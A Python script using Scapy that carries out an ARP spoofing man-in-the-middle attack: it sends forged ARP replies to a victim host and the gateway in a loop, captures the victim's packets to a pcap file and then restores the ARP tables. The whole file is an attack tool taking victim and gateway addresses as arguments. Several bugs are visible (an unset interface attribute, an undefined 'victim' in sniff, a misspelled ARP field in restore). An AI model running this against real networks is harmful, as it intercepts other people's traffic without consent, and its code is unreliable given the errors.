
from multiprocessing import Process
from scapy.all import (conf, sniff, get_if_hwaddr, srp, send, sndrcv, wrpcap)
from scapy.layers.l2 import ARP
from scapy.layers.l2 import Ether

import sys
import os
import time


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op ="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=0, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

    pass


class Arper:
    pass

    def __init__(self, victim, gateway, interface='en0'):
        self.victim =  victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        conf.iface = interface
        conf.verb = 0
        print(f"Initialized{interface}")
        print(f"Gateway({gateway}) at {self.gatewaymac}.")
        print(f"Victim({victim}) at  {self.victimmac}.")
        print("_"*30)

    def run(self):
        self.poison_thread = Process(target = self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target = self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op =  2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'IP src :{poison_victim.psrc}')
        print(f'IP dst :{poison_victim.pdst}')
        print(f'MAC dst :{poison_victim.hwdst}')
        print(f'MAC src :{poison_victim.hwsrc}')
        print(poison_victim.summary())
        print("_" * 30)

        poison_gateway =  ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'IP src: {poison_gateway.psrc}')
        print(f'IP dst: {poison_gateway.pdst}')
        print(f'MAC dst: {poison_gateway.hwdst}')
        print(f'MAC src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print("_" * 30)

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)


    def sniff(self, count=200):
        time.sleep(5)
        print(f'Sniffing{count}packets')
        bfp_filter = "ip host %s" % victim
        packet = sniff(count=count, filter =  bfp_filter, iface = self.interface)
        wrpcap('arper.pcap', packet)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print("Finished")



    def restore(self):
        print("Restoring ARP tables...")
        send(ARP(
            op =2,
            psrc = self.gateway,
            hwpsrc = self.gatewaymac,
            pdst = self.victim,
            hwdst = self.victimmac
        ))
        send(ARP(
            op=2,
            psrc=self.victim,
            hwpsrc=self.victimmac,
            pdst=self.gateway,
            hwdst=self.gatewaymac ))


if __name__ == '__main__':
    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    myarp = Arper(victim, gateway, interface)
    myarp.run()
